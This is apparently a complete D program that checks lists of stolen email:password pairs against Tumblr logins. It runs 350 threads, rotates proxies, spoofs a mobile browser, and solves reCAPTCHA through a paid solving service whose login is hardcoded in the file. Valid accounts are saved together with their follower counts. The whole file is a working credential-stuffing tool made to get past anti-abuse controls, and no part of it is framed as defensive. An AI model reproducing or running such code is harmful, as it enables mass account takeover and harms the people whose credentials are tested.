module main;

import core.thread;
import etc.c.curl : CurlOption, CurlInfo;
import std.array;
import std.conv;
import std.file;
import std.net.curl;
import std.parallelism;
import std.regex;
import std.stdio;
import core.time;
import std.datetime;
import std.string;
import std.process;
import std.uri;
import std.json;
import std.exception;
import std.uni;
import std.random;
import core.memory;
import std.digest.md;
import core.stdc.string;
import std.stdio;
private import stdlib = core.stdc.stdlib : exit;

string runCaptcha(string img, string duser, string dpass)
{
	writeln("Running Captcha Check!");
	string bound = "---------------------------723690991551375881941829999";
	auto conn = HTTP("http://api.dbcapi.me/api/captcha");
	conn.handle.set(CurlOption.followlocation, false);
	conn.handle.set(CurlOption.ssl_verifypeer, false);
	conn.addRequestHeader("Content-Type", "multipart/form-data; boundary=" ~ bound ~ "; charset=UTF-8");
	conn.addRequestHeader("Accept", "application/json; charset=utf-8");
	string postData = "--" ~ bound ~ "\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n" ~ duser ~ "\r\n--" ~ bound ~ "\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n" ~ dpass ~ "\r\n--" ~ bound ~ "\r\nContent-Disposition: form-data; name=\"captchafile\"; filename=\"captchafile\";\r\nContent-Type: application/octet-stream\r\n\r\n" ~ to!string(img) ~ "\r\n--" ~ bound ~ "--\r\n";
	conn.postData = postData;
	conn.perform();
	string url = conn.responseHeaders["location"];
	string text;
	bool solved = false;
	while(!solved)
	{
		ubyte[] result;
		auto conn1 = HTTP(url);
		conn1.handle.set(CurlOption.ssl_verifypeer, false);
		conn1.addRequestHeader("Accept", "application/json; charset=utf-8");
		conn1.onReceive = (ubyte[] data)
		{
			result ~= data;
			return data.length;
		};
		conn1.perform();
		char* cstr = cast(char*) result;
		string str = cast(string) cstr[0..strlen(cstr)];
		
		auto js = parseJSON(str);
		if (!chomp(js["text"].str).empty)
		{
			text = js["text"].str;
			writeln("Found Captcha Text: " ~ text);
			solved = true;
		}
		else
		{
			core.thread.Thread.sleep(dur!("seconds")(1));
		}
	}
	return text;
}

void run(string user, string pass)
{
	auto plines = readText("./proxies.txt").splitLines();
	auto proxy = chomp(plines[uniform(0, plines.length - 1)]);
	int trys = 0;
	bool done = false;
	while (!done) {
		try
		{
			if (trys >= 5 && proxy != null) {
				plines = readText("./proxies.txt").splitLines();
				proxy = chomp(plines[uniform(0, plines.length - 1)]);
				trys = 0;
			}
			writeln("Begin Checking Account! " ~ user);
			bool working = false;
			string captchatext;
			auto conn = HTTP();
			conn.handle.set(CurlOption.ssl_verifypeer, 0);
			conn.operationTimeout(dur!"seconds"(25));
			conn.handle.set(CurlOption.proxy, proxy);
			
			auto rand = uniform(99999999999999, 99999999999999999);
			conn.setCookieJar(tempDir() ~ to!string(rand));
			conn.addRequestHeader("User-Agent", "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30");
			auto html = get("https://www.tumblr.com/login?from_splash=1", conn);

			auto token = match(html, regex("tumblr-form-key\" content=\"(.*?)\"")).captures[1];

			conn.addRequestHeader("Referer", "https://www.tumblr.com/");
			string postData = "user%5Bemail%5D=" ~ user ~ "&user%5Bpassword%5D=" ~ pass ~ "&form_key=" ~ to!string(token) ~ "&tumblelog%5Bname%5D=&user%5Bage%5D=&context=login&version=STANDARD&follow=&http_referer=https%3A%2F%2Fwww.tumblr.com%2F&seen_suggestion=0&used_suggestion=0&used_auto_suggestion=0&about_tumblr_slide=";
			html = post("https://www.tumblr.com/login", postData, conn);
			if (html.indexOf("Your email or password were incorrect.") != -1)
			{
				writeln("Account Does Not Work! " ~ user);
				std.file.append("./Tumblr Non-Working.txt", user ~ ":" ~ pass ~ "\r\n");
				return;
			}
			else if (html.indexOf("There was a problem logging in, try again later.") != -1) 
			{
				done = false;
			}
			else if (html.indexOf("g-recaptcha") != -1) 
			{
				string duser = "Fotoko";
				string dpass = "asdf1623";
				if (duser != null) {
					bool captcha = true;
					while (captcha)
					{
						writeln("Account Has Captcha! " ~ user);
						
						html = get("http://api.recaptcha.net/noscript?k=6LcaLgATAAAAAMfyoZjBXW33zuRRJq9pFvsE9HJJ", conn);

						auto captcha1 = match(html, regex("recaptcha_challenge_field\" value=\"(.*?)\"")).captures[1];
						
						download("http://api.recaptcha.net/image?c=" ~ to!string(captcha1), tempDir() ~ to!string(rand) ~ ".jpg", conn);
						auto captchass = read(tempDir() ~ to!string(rand) ~ ".jpg");
						captchatext = runCaptcha(to!string(captchass), duser, dpass);

						postData = "recaptcha_challenge_field=" ~ to!string(captcha1) ~ "&recaptcha_response_field=" ~ captchatext ~ "&submit=I%27m+a+human";
						html = post("http://api.recaptcha.net/noscript?k=6LcaLgATAAAAAMfyoZjBXW33zuRRJq9pFvsE9HJJ", postData, conn);

						auto captcharesponse = match(html, regex(">(.*?)</text")).captures[1];

						postData = "g-recaptcha-response=" ~ to!string(captcharesponse) ~ "&recaptcha_form=true&user%5Bemail%5D=" ~ user ~ "&user%5Bpassword%5D=" ~ pass ~ "&tumblelog%5Bname%5D=&user%5Bage%5D=&context=login&version=STANDARD&follow=&http_referer=https%3A%2F%2Fwww.tumblr.com%2Flogin&form_key=" ~ to!string(token) ~ "&seen_suggestion=0&used_suggestion=0&used_auto_suggestion=0&about_tumblr_slide=";
						html = post("https://www.tumblr.com/login", postData, conn);
						captcha = false;
						if (html.indexOf("Your email or password were incorrect.") != -1)
						{
							writeln("Account Does Not Work! " ~ user);
							std.file.append("./Tumblr Non-Working.txt", user ~ ":" ~ pass ~ "\r\n");
							return;
						}
						else if (html.indexOf("There was a problem logging in, try again later.") != -1) 
						{
							done = false;
							captcha = false;
						}
						else if (html.indexOf("g-recaptcha") != -1)
						{
							captcha = true;
						}
						else if (html.indexOf("Log out") != -1)
						{
							captcha = false;
							working = true;
						}
					}
				}
			}
			else if (html.indexOf("Log out") != -1)
			{
				working = true;
			}
			
			if (working)
			{
				html = get("https://www.tumblr.com/settings", conn);
				auto blog = match(html, regex("accordion_trigger\">(.*?)</span>")).captures[1];
				html = get("https://www.tumblr.com/blog/" ~ blog ~ "/followers", conn);
				auto followers = match(html, regex("title\">(.*?) people")).captures[1];
				done = true;
				delete html;
				writeln("Account " ~ user ~ " works and has " ~ followers ~ " followers");
				std.file.append("./Tumblr Working.txt", user ~ ":" ~ pass ~ " (Followers: " ~ followers ~ ")\r\n");
				return;
			}
		} catch (CurlException e) {
			writeln(e.msg);
			plines = readText(getcwd() ~ "/proxies.txt").splitLines();
			done = false;
			proxy = chomp(plines[uniform(0, plines.length - 1)]);
			core.thread.Thread.sleep(dur!("seconds")(1));
		}
		trys += 1;
	}
}

void startRun()
{
	int threads = 350;
	auto accounts = readText("./accounts.txt").splitLines();
	auto work = new TaskPool(threads);
	foreach (account; work.parallel(accounts))
	{
		if(account.indexOf(":") != -1 && account.indexOf("@") != -1 && account.indexOf("+") == -1)
		{
			auto arr = split(account, ":");
			run(normalize(to!string(chomp(arr[0]))), normalize(to!string(chomp(arr[1]))));
		}
	}
}


void main(string[] args)
{
	startRun();
}

